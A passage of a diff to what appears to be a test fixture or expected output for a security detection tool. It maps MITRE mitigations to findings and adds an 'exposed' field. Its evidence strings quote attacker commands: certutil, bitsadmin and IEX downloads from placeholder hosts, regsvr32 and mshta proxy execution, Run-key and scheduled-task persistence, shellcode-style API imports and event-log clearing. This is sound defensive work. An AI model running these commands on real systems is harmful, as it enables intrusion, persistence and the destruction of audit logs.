(loader_20261020_102600.cs:4)\nFileDownload: certutil -urlcache -f http://203.0.113.10/c.exe %TEMP%\\c.exe (20261020_103000_step07_cleanup.bat:2)\nFileDownload: certutil -urlcache -split -f http://203.0.113.10/a.b64 C:\\Users\\Public\\a.b64 (proc_20261020_103500.jsonl)\nReflectiveCodeLoading: $asm = [System.Reflection.Assembly]::Load($out.ToArray()) (20261020_102000_step05_dotnet.ps1:11)\nReflectiveCodeLoading: $asm.EntryPoint.Invoke($null, @(,[string[]]@())) (20261020_102000_step05_dotnet.ps1:12)\nSignedBinaryProxyExecution: rundll32.exe C:\\Users\\Public\\a.dll,Start (20261020_101000_step03_exec.ps1:1)\nSignedBinaryProxyExecution: regsvr32.exe /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll (20261020_101000_step03_exec.ps1:2)\nSignedBinaryProxyExecution: mshta http://203.0.113.10/a.hta (20261020_101000_step03_exec.ps1:3)\nSignedBinaryProxyExecution: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Users\\Public\\build_20261020_101200.xml (20261020_101000_step03_exec.ps1:4)\nSignedBinaryProxyExecution: cmd.exe /c \"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /U C:\\Users\\Public\\a.dll\" (20261020_101000_step03_exec.ps1:5)\nSignedBinaryProxyExecution: schtasks.exe /create /tn Updater /tr \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /sc onlogon /f (20261020_101500_step04_persist.ps1:1)\nSignedBinaryProxyExecution: reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /f (20261020_101500_step04_persist.ps1:2)\nSignedBinaryProxyExecution: regsvr32 /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll (proc_20261020_103500.jsonl)\nSignedBinaryProxyExecution: schtasks /create /tn Updater /tr \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /sc onlogon /f (proc_20261020_103500.jsonl)\nRuntimeCompilation: Add-Type -TypeDefinition $src (20261020_102500_step06_pinvoke.ps1:9)\nNativeApiCall: [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p); (20261020_102500_step06_pinvoke.ps1:5)\nNativeApiCall: [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i); (20261020_102500_step06_pinvoke.ps1:6)\nProcessStart: [System.Diagnostics.Process]::Start(\"cmd.exe\", \"/c whoami\") (20261020_102500_step06_pinvoke.ps1:11)"
+    "evidence": "FileDownload: certutil.exe -urlcache -split -f http://203.0.113.10/a.b64 C:\\Users\\Public\\a.b64 (20261020_100500_step02_download.ps1:1)\nFileDownload: bitsadmin.exe /transfer job /download /priority high http://203.0.113.10/b.bin C:\\Users\\Public\\b.bin (20261020_100500_step02_download.ps1:3)\nFileDownload: Start-BitsTransfer -Source http://203.0.113.10/c.bin -Destination C:\\Users\\Public\\c.bin (20261020_100500_step02_download.ps1:4)\nFileDownload: public override bool Execute() { new WebClient().DownloadFile(\"http://203.0.113.10/d.bin\", \"d.bin\"); return true; } (build_20261020_101200.xml)\nFileDownload: $b64 = $wc.DownloadString(\"http://203.0.113.20/stage.txt\") (20261020_102000_step05_dotnet.ps1:2)\nFileDownload: IEX (New-Object Net.WebClient).DownloadString(\"http://203.0.113.20/next.ps1\") (20261020_102500_step06_pinvoke.ps1:12)\nFileDownload: class L { static void Main() { var b = new WebClient().DownloadData(\"http://203.0.113.20/p.bin\"); Assembly.Load(b).EntryPoint.Invoke(null, null); } } (loader_20261020_102600.cs:4)\nFileDownload: certutil -urlcache -f http://203.0.113.10/c.exe %TEMP%\\c.exe (20261020_103000_step07_cleanup.bat:2)\nFileDownload: certutil -urlcache -split -f http://203.0.113.10/a.b64 C:\\Users\\Public\\a.b64 (proc_20261020_103500.jsonl)\nReflectiveCodeLoading: $asm = [System.Reflection.Assembly]::Load($out.ToArray()) (20261020_102000_step05_dotnet.ps1:11)\nReflectiveCodeLoading: $asm.EntryPoint.Invoke($null, @(,[string[]]@())) (20261020_102000_step05_dotnet.ps1:12)\nSignedBinaryProxyExecution: rundll32.exe C:\\Users\\Public\\a.dll,Start (20261020_101000_step03_exec.ps1:1)\nSignedBinaryProxyExecution: regsvr32.exe /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll (20261020_101000_step03_exec.ps1:2)\nSignedBinaryProxyExecution: mshta http://203.0.113.10/a.hta (20261020_101000_step03_exec.ps1:3)\nSignedBinaryProxyExecution: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Users\\Public\\build_20261020_101200.xml (20261020_101000_step03_exec.ps1:4)\nSignedBinaryProxyExecution: cmd.exe /c \"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /U C:\\Users\\Public\\a.dll\" (20261020_101000_step03_exec.ps1:5)\nSignedBinaryProxyExecution: schtasks.exe /create /tn Updater /tr \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /sc onlogon /f (20261020_101500_step04_persist.ps1:1)\nSignedBinaryProxyExecution: reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /f (20261020_101500_step04_persist.ps1:2)\nSignedBinaryProxyExecution: regsvr32 /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll (proc_20261020_103500.jsonl)\nSignedBinaryProxyExecution: schtasks /create /tn Updater /tr \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /sc onlogon /f (proc_20261020_103500.jsonl)\nRuntimeCompilation: Add-Type -TypeDefinition $src (20261020_102500_step06_pinvoke.ps1:9)\nNativeApiCall: [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p); (20261020_102500_step06_pinvoke.ps1:5)\nNativeApiCall: [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i); (20261020_102500_step06_pinvoke.ps1:6)\nProcessStart: [System.Diagnostics.Process]::Start(\"cmd.exe\", \"/c whoami\") (20261020_102500_step06_pinvoke.ps1:11)",
+    "exposed": null
   },
   {
     "item": "Recover the missing logs",
@@ -633,7 +581,8 @@
     "attack": null,
     "atlas": null,
     "targets": "log Security; log System",
-    "evidence": "EventLogClearing: wevtutil cl Security (20261020_101500_step04_persist.ps1:3)\nEventLogClearing: wevtutil cl System (20261020_103000_step07_cleanup.bat:3)\nEventLogClearing: wevtutil cl Security (proc_20261020_103500.jsonl)"
+    "evidence": "EventLogClearing: wevtutil cl Security (20261020_101500_step04_persist.ps1:3)\nEventLogClearing: wevtutil cl System (20261020_103000_step07_cleanup.bat:3)\nEventLogClearing: wevtutil cl Security (proc_20261020_103500.jsonl)",
+    "exposed": null
   },
   {
     "item": "Follow what was enumerated",
@@ -644,8 +593,9 @@
     "files": "20261020_100000_step01_recon.ps1, 20261020_102500_step06_pinvoke.ps1, recon_20261020_100030.txt",
     "attack": null,
     "atlas": null,
-    "targets": "username svc_build",
-    "evidence": "whoami: whoami /all (20261020_100000_step01_recon.ps1:1)\nnltest: nltest /dclist:corp.example >> recon_20261020_100030.txt (20261020_100000_step01_recon.ps1:2)\nnet.exe: net.exe group \"Domain Admins\" /domain >> recon_20261020_100030.txt (20261020_100000_step01_recon.ps1:3)\nwmic.exe: wmic.exe process list brief (20261020_100000_step01_recon.ps1:4)\nwhoami: whoami (20261020_102500_step06_pinvoke.ps1:11)"
+    "targets": null,
+    "evidence": "whoami: whoami /all (20261020_100000_step01_recon.ps1:1)\nnltest: nltest /dclist:corp.example >> recon_20261020_100030.txt (20261020_100000_step01_recon.ps1:2)\nnet.exe: net.exe group \"Domain Admins\" /domain >> recon_20261020_100030.txt (20261020_100000_step01_recon.ps1:3)\nwmic.exe: wmic.exe process list brief (20261020_100000_step01_recon.ps1:4)\nwhoami: whoami (20261020_102500_step06_pinvoke.ps1:11)",
+    "exposed": "username: svc_build"
   },
   {
     "item": "M1018 User Account Management",
@@ -657,7 +607,8 @@
     "attack": "T1047, T1053.005",
     "atlas": null,
     "targets": "ProcessStart: program cmd.exe; ScheduledTaskCreation: task Updater, runs rundll32.exe C:\\Users\\Public\\a.dll,Start",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1022 Restrict File and Directory Permissions",
@@ -669,7 +620,8 @@
     "attack": "T1685.005",
     "atlas": null,
     "targets": "EventLogClearing: log Security, log System",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1026 Privileged Account Management",
@@ -681,7 +633,8 @@
     "attack": "T1047, T1053.005, T1055, T1059, T1059.001, T1218",
     "atlas": null,
     "targets": "ProcessStart: program cmd.exe; ScheduledTaskCreation: task Updater, runs rundll32.exe C:\\Users\\Public\\a.dll,Start; NativeApiCall: function VirtualAlloc, library kernel32.dll, function CreateThread; DownloadAndExecute: url http://203.0.113.20/next.ps1; SignedBinaryProxyExecution: binary rundll32, binary regsvr32, url http://203.0.113.10/x.sct, binary mshta, url http://203.0.113.10/a.hta, binary MSBuild, binary InstallUtil",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1028 Operating System Configuration",
@@ -693,7 +646,8 @@
     "attack": "T1053.005",
     "atlas": null,
     "targets": "ScheduledTaskCreation: task Updater, runs rundll32.exe C:\\Users\\Public\\a.dll,Start",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1029 Remote Data Storage",
@@ -705,7 +659,8 @@
     "attack": "T1685.005",
     "atlas": null,
     "targets": "EventLogClearing: log Security, log System",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1030 Network Segmentation",
@@ -717,7 +672,8 @@
     "attack": "T1095",
     "atlas": null,
     "targets": "NetworkSocket: host 203.0.113.30",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1031 Network Intrusion Prevention",
@@ -729,7 +685,8 @@
     "attack": "T1095, T1105",
     "atlas": null,
     "targets": "NetworkSocket: host 203.0.113.30; FileDownload: url http://203.0.113.10/a.b64, url http://203.0.113.10/b.bin, url http://203.0.113.10/c.bin, url http://203.0.113.10/d.bin, url http://203.0.113.20/stage.txt, url http://203.0.113.20/next.ps1, url http://203.0.113.20/p.bin, url http://203.0.113.10/c.exe; DownloadAndExecute: url http://203.0.113.20/next.ps1",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1037 Filter Network Traffic",
@@ -741,7 +698,8 @@
     "attack": "T1095, T1105, T1218",
     "atlas": null,
     "targets": "NetworkSocket: host 203.0.113.30; FileDownload: url http://203.0.113.10/a.b64, url http://203.0.113.10/b.bin, url http://203.0.113.10/c.bin, url http://203.0.113.10/d.bin, url http://203.0.113.20/stage.txt, url http://203.0.113.20/next.ps1, url http://203.0.113.20/p.bin, url http://203.0.113.10/c.exe; DownloadAndExecute: url http://203.0.113.20/next.ps1; SignedBinaryProxyExecution: binary rundll32, binary regsvr32, url http://203.0.113.10/x.sct, binary mshta, url http://203.0.113.10/a.hta, binary MSBuild, binary InstallUtil",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1038 Execution Prevention",
@@ -753,7 +711,8 @@
     "attack": "T1047, T1059, T1059.001, T1106, T1127, T1218",
     "atlas": null,
     "targets": "ProcessStart: program cmd.exe; DownloadAndExecute: url http://203.0.113.20/next.ps1; NativeApiCall: function VirtualAlloc, library kernel32.dll, function CreateThread; SignedBinaryProxyExecution: binary rundll32, binary regsvr32, url http://203.0.113.10/x.sct, binary mshta, url http://203.0.113.10/a.hta, binary MSBuild, binary InstallUtil",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1041 Encrypt Sensitive Information",
@@ -765,7 +724,8 @@
     "attack": "T1685.005",
     "atlas": null,
     "targets": "EventLogClearing: log Security, log System",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1042 Disable or Remove Feature or Program",
@@ -777,7 +737,8 @@
     "attack": "T1059, T1059.001, T1127, T1218",
     "atlas": null,
     "targets": "ProcessStart: program cmd.exe; DownloadAndExecute: url http://203.0.113.20/next.ps1; SignedBinaryProxyExecution: binary rundll32, binary regsvr32, url http://203.0.113.10/x.sct, binary mshta, url http://203.0.113.10/a.hta, binary MSBuild, binary InstallUtil",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1045 Code Signing",
@@ -789,7 +750,8 @@
     "attack": "T1059, T1059.001",
     "atlas": null,
     "targets": "ProcessStart: program cmd.exe; DownloadAndExecute: url http://203.0.113.20/next.ps1",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1047 Audit",
@@ -801,7 +763,8 @@
     "attack": "T1053.005, T1059, T1095",
     "atlas": null,
     "targets": "ScheduledTaskCreation: task Updater, runs rundll32.exe C:\\Users\\Public\\a.dll,Start; ProcessStart: program cmd.exe; NetworkSocket: host 203.0.113.30",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1049 Antivirus/Antimalware",
@@ -813,7 +776,8 @@
     "attack": "T1059, T1059.001",
     "atlas": null,
     "targets": "ProcessStart: program cmd.exe; DownloadAndExecute: url http://203.0.113.20/next.ps1",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1021 Restrict Web-Based Content",
@@ -825,7 +789,8 @@
     "attack": "T1059, T1127, T1218",
     "atlas": null,
     "targets": "ProcessStart: program cmd.exe; SignedBinaryProxyExecution: binary rundll32, binary regsvr32, url http://203.0.113.10/x.sct, binary mshta, url http://203.0.113.10/a.hta, binary MSBuild, binary InstallUtil",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1033 Limit Software Installation",
@@ -837,7 +802,8 @@
     "attack": "T1059",
     "atlas": null,
     "targets": "ProcessStart: program cmd.exe",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1040 Behavior Prevention on Endpoint",
@@ -849,7 +815,8 @@
     "attack": "T1047, T1055, T1059, T1106",
     "atlas": null,
     "targets": "ProcessStart: program cmd.exe; NativeApiCall: function VirtualAlloc, library kernel32.dll, function CreateThread",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1050 Exploit Protection",
@@ -861,7 +828,8 @@
     "attack": "T1218",
     "atlas": null,
     "targets": "SignedBinaryProxyExecution: binary rundll32, binary regsvr32, url http://203.0.113.10/x.sct, binary mshta, url http://203.0.113.10/a.hta, binary MSBuild, binary InstallUtil",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "AML.M0011 Restrict Library Loading",
@@ -873,7 +841,8 @@
     "attack": null,
     "atlas": "AML.T0050, AML.T0142",
     "targets": "DownloadAndExecute: url http://203.0.113.20/next.ps1; ProcessStart: program cmd.exe; RunKeyPersistence: value Updater, runs rundll32.exe C:\\Users\\Public\\a.dll,Start",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "AML.M0013 Code Signing",
@@ -885,7 +854,8 @@
     "attack": null,
     "atlas": "AML.T0142",
     "targets": "RunKeyPersistence: value Updater, runs rundll32.exe C:\\Users\\Public\\a.dll,Start",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "AML.M0043 AI Agent External Resource Lifecycle Management",
@@ -897,7 +867,8 @@
     "attack": null,
     "atlas": "AML.T0072",
     "targets": "FileDownload: url http://203.0.113.10/a.b64, url http://203.0.113.10/b.bin, url http://203.0.113.10/c.bin, url http://203.0.113.10/d.bin, url http://203.0.113.20/stage.txt, url http://203.0.113.20/next.ps1, url http://203.0.113.20/p.bin, url http://203.0.113.10/c.exe; DownloadAndExecute: url http://203.0.113.20/next.ps1; NetworkSocket: host 203.0.113.30",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "AML.M0020 Generative AI Guardrails",
@@ -909,7 +880,8 @@
     "attack": null,
     "atlas": "AML.T0102",
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "AML.M0022 Generative AI Model Alignment",
@@ -921,6 +893,7 @@
     "attack": null,
     "atlas": "AML.T0102",
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   }
 ]
